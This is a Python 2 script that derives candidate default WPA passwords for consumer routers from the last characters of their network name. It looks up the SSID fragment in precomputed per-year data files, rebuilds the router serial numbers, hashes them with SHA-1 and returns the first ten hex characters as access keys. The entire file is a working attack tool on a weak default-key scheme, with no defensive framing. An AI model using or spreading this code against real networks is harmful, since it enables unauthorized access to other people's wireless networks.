import hashlib
import sys
import binascii
import re
import os

import sys, os.path

localdir = repr(os.path.dirname(os.path.realpath(sys.argv[0])))

localdir = localdir.replace("\\\\","/")
localdir = localdir.replace("\'","")

def ascii2hex(char):
  return hex(ord(char))[2:].upper()
  
def calc(ssidend):
    pwd = []
    ssidend = ssidend.upper()

    if len(ssidend) == 6:
        findpos = 0  
    elif len(ssidend) == 4:
        findpos = 1


    years = [ 2010, 2009, 2008, 2007, 2006, 2005, 2004 ]



    charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    bincode = binascii.unhexlify("".join(ssidend.split()))

    for year in years:
        file = localdir+"/config/data/dbspeedcalc_" + str(year) + ".dat"
        infile = open(file,"rb")
        filedata = infile.read()
        infile.close()
        wherefound = filedata.find(bincode, 0)
        while (wherefound > -1):
            if wherefound % 3 == findpos:
                prodidnum = (wherefound / 3) % (36*36*36)
                prodweek = (wherefound / 3) / (36*36*36) +1
                prodid1 = prodidnum / (36*36)
                prodid2 = (prodidnum / 36) % 36
                prodid3 = prodidnum % 36
                serial = 'CP%02d%02d%s%s%s' % (year-2000,prodweek,ascii2hex(charset[prodid1:prodid1+1]),ascii2hex(charset[prodid2:prodid2+1]),ascii2hex(charset[prodid3:prodid3+1]))
                sha1sum = hashlib.sha1(serial).digest().encode("hex").upper()
                ssid = sha1sum[-6:]
                accesskey = sha1sum[0:10]
                if len(ssidend) == 4:
                    accesskey = accesskey.lower()
                    pwd.append(accesskey)
                else:
                    pwd.append(accesskey)
                    

            wherefound = filedata.find(bincode, wherefound+1)
    return pwd